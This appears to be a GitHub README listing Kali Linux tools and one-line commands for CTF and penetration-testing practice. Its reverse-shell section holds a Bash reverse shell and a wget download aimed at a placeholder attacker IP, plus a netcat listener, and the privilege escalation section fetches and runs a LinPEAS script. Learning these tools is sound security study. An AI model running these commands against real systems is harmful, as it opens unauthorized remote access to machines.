# CTF Tools and Commands
<img src="/src/hi.webp" align = "center">

---

## 🔥 Kali Linux Tools and Commands

This repository contains a collection of useful tools and commands for Kali Linux, categorized based on their usage in penetration testing, cybersecurity, and ethical hacking.

---

## 📌 Table of Contents

1. [🐧 Basic Linux Commands](#-basic-linux-commands)
2. [🌍 Network Scanning & Enumeration](#-network-scanning--enumeration)
3. [🔓 Web Exploitation Tools](#-web-exploitation-tools)
4. [🕵️‍♂️ Forensics & Steganography](#-forensics--steganography)
5. [📡 Wireless Attacks](#-wireless-attacks)
6. [🎭 Privilege Escalation](#-privilege-escalation)
7. [📂 File Transfer & Reverse Shells](#-file-transfer--reverse-shells)
8. [🎯 Tool Downloads](#-tool-downloads)

---

## 🐧 Basic Linux Commands

These are fundamental Linux commands every Kali Linux user should know.

| Command | Description |
| ------- | -------------------------------- |
| `cd` | Change directory |
| `ls` | List files and directories |
| `pwd` | Print current working directory |
| `cp` | Copy files or directories |
| `mv` | Move or rename files and directories |
| `rm` | Remove files or directories |
| `cat` | View file content |
| `echo` | Print text to terminal or file |
| `chmod` | Change file permissions |
| `chown` | Change file ownership |
| `find` | Search for files and directories |
| `grep` | Search for patterns inside files |

---

## 🌍 Network Scanning & Enumeration

| Tool | Description | Command |
| --------------- | ------------------------------------------ | ------------------------- |
| **Nmap** | Network scanning & vulnerability detection | `nmap [options] [target]` |
| **Netcat** | Network debugging and port scanning | `nc -l -p [port]` |
| **Wireshark** | GUI-based network protocol analyzer | `wireshark` |
| **Tcpdump** | CLI-based network packet capture tool | `tcpdump -i eth0` |
| **Masscan** | Fast port scanner | `masscan -p1-65535 [target]` |

---

## 🔓 Web Exploitation Tools

| Tool | Description | Command |
| -------------- | -------------------------------- | ------------------------ |
| **Burp Suite** | Web security testing framework | `burpsuite` |
| **Nikto** | Web server vulnerability scanner | `nikto -h [target]` |
| **SQLmap** | Automated SQL injection tool | `sqlmap -u [target_url]` |
| **Gobuster** | Directory and file brute-forcing | `gobuster dir -u [URL]` |
| **WFUZZ** | Web application brute-forcing | `wfuzz -c -z file,wordlist.txt --hc 404 [URL]/FUZZ` |

---

## 🕵️‍♂️ Forensics & Steganography

| Tool | Description | Command |
| ------------ | -------------------------------------- | -------------------- |
| **Exiftool** | Extract metadata from images and files | `exiftool [file]` |
| **Binwalk** | Analyze and extract firmware images | `binwalk -e [file]` |
| **Foremost** | File recovery based on headers | `foremost -i [file]` |
| **Steghide** | Hide/extract data in images | `steghide embed -cf image.jpg -ef secret.txt` |
| **Aperisolve** | Online steganography analysis | [🔗 Visit](https://www.aperisolve.com/) |

---

## 📡 Wireless Attacks

| Tool | Description | Command |
| --------------- | ------------------------------------------ | -------------------------- |
| **Aircrack-ng** | Wireless security auditing | `airmon-ng start wlan0` |
| **Kismet** | Wireless network discovery | `kismet` |
| **Reaver** | WPS attack tool | `reaver -i wlan0 -b [BSSID] -vv` |
| **Fern Wifi Cracker** | GUI for wireless auditing | `fern-wifi-cracker` |

---

## 🎭 Privilege Escalation

| Tool | Description | Command |
| --------------- | ------------------------------------------ | -------------------------- |
| **LinPEAS** | Linux privilege escalation checker | `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh` |
| **Windows-Exploit-Suggester** | Windows privilege escalation tool | `python windows-exploit-suggester.py --update` |
| **GTFOBins** | Find binaries useful for privilege escalation | [🔗 Visit](https://gtfobins.github.io/) |

---

## 📂 File Transfer & Reverse Shells

| Command | Description |
| --------------- | ------------------------------------------ |
| `scp file user@host:/path/to/destination` | Securely copy files via SSH |
| `wget http://[attacker_ip]/file -O /tmp/file` | Download a file using wget |
| `nc -lvnp 4444` | Start a netcat listener |
| `bash -i >& /dev/tcp/[attacker_ip]/4444 0>&1` | Reverse shell via Bash |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell to an interactive TTY |

---

## 🎯 Tool Downloads

- **Nmap**: [Download](https://nmap.org/download.html)
- **Wireshark**: [Download](https://www.wireshark.org/download.html)
- **SQLmap**: [Download](https://github.com/sqlmapproject/sqlmap)
- **Steghide**: [Download](http://steghide.sourceforge.net/download.php)
- **Burp Suite**: [Download](https://portswigger.net/burp/communitydownload)

---

## 🤝 Contributing

If you want to contribute, feel free to open an issue or submit a pull request.

💌 Contact: 
[Email](khairulislamtushar33@gmail.com)
[GitHub](https://github.com/Ki6uiPar1na)

---

🚀 **Happy Hacking! Stay Ethical.** 🛡️

